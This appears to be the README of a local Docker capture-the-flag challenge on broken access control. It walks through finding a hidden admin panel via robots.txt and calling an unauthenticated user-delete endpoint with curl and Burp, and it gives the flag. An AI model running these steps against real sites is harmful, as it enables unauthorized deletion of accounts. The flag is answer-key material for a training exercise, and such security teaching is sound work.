# IITCTF — Unprotected Admin Functionality

Local Docker training challenge inspired by the PortSwigger Web Security Academy
"Unprotected admin functionality" lab.

## Run

```bash
docker compose up --build
```

Open:

```text
http://127.0.0.1:8080/
```

## CTF solve path

### 1. Recon

```bash
curl -i http://127.0.0.1:8080/robots.txt
```

You should discover:

```text
Disallow: /administrator-panel
```

### 2. Test access control

```bash
curl -i http://127.0.0.1:8080/administrator-panel
```

The administrator page is accessible without an administrator session.

### 3. Inspect the functionality

The page contains links similar to:

```text
/administrator-panel/delete?username=carlos
```

### 4. Trigger the vulnerable administrative action

For example:

```bash
curl -i "http://127.0.0.1:8080/administrator-panel/delete?username=carlos"
```

The training flag is returned:

```text
IITCTF{unprotected_admin_functionality}
```

## Burp Suite workflow

1. Browse to `http://127.0.0.1:8080/`.
2. Turn Burp Proxy on.
3. Request `/robots.txt`.
4. Discover `/administrator-panel`.
5. Request `/administrator-panel`.
6. Inspect the delete endpoint.
7. Send the request to Repeater.
8. Observe that no authorization check is enforced.

## Vulnerability

This challenge intentionally demonstrates broken access control / vertical
privilege escalation: administrative functionality can be reached without the
required administrator authorization.

This container is intentionally vulnerable and is designed for local CTF
practice only.
